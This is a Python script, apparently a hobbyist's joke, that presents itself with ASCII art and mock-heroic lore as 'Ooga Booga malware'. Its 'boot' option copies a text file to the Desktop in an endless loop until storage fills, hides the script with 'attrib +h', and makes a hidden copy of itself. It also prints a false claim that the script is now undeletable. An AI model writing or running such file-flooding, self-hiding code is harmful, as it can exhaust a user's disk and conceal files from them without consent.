# Ooga Booga: The Rebirth

import os
import shutil

# ASCII art
print("""

╔═╗───────╔══╗──────────╔═╗─╔╗╔╗─╔╗╔╗
║║╠═╦═╦═╗─║╔╗╠═╦═╦═╦═╗╔╗║╬╠═╣╚╬╬╦╣╚╣╚╗
║║║╬║╬║╬╚╗║╔╗║╬║╬║╬║╬╚╬╣║╗╣╩╣╬║║╔╣╔╣║║
╚═╩═╬╗╠══╝╚══╩═╩═╬╗╠══╩╝╚╩╩═╩═╩╩╝╚═╩╩╝
────╚═╝──────────╚═╝""")
# Menu options
while True:
    print("\nBoot options:")
    print("Lore")
    print("Boot")
    print("Disable")
    option = input("\nSelect an option: ").lower()

    # Lore
    if option == "lore":
        print("\nIn our world ruled by darkness and tyranny, the only hope for liberation and knowledge are the ancient text of Ooga Booga. It is said that whoever possesses all the texts will have the power to overcome any and all obstacles. Even death. However, most of the original texts and weapons were destroyed centuries ago in an epic battle. After the great battle, a certain deceitful messiah by the name of Sir Waltz attempted to deceive the people with what he claimed were the true texts of Ooga Booga. The gods struck him and his deceit down horrificly for his lies. But now, through the power of technology, god has truly revealed to us a formerly ancient medieval weapon, that has been transformed into a modern, technological weapon of mass destruction. In the hands of noble warriors, the rebirthed Ooga Booga malware could liberate a entire world from tyranny.")
    
    # Boot
    elif option == "boot":
        while True:
            # Copy the file
            shutil.copyfile("OogaBooga.txt", "Desktop/OogaBooga.txt")

            # Make copies of the Booga file
            i = 0
            while i >= 0:
                shutil.copyfile("OogaBooga.txt", f"Desktop/OogaBooga_{i}.txt")
                i += 1

            
            os.system("attrib +h main.py")

           
            shutil.copyfile("main.py", "main_copy.py")

            
            os.system("attrib +h main_copy.py")

            # Print message
            print("""The texts of Ooga Booga have been summoned by our lord. Good luck noble warrior. Text file copied. Ooga Booga files created. Script made undeletable. Script copied.""")

    # Disable
    elif option == "disable":
        # Delete all files
        os.remove("main.py")
        os.remove("main_copy.py")
        i = 0
        while i >= 0:
            try:
                os.remove(f"Desktop/OogaBooga_{i}.txt")
                i += 1
            except:
                break
        os.remove("Desktop/OogaBooga.txt")
        break

    # Invalid option
    else:
        print("Invalid option. Please try again.")


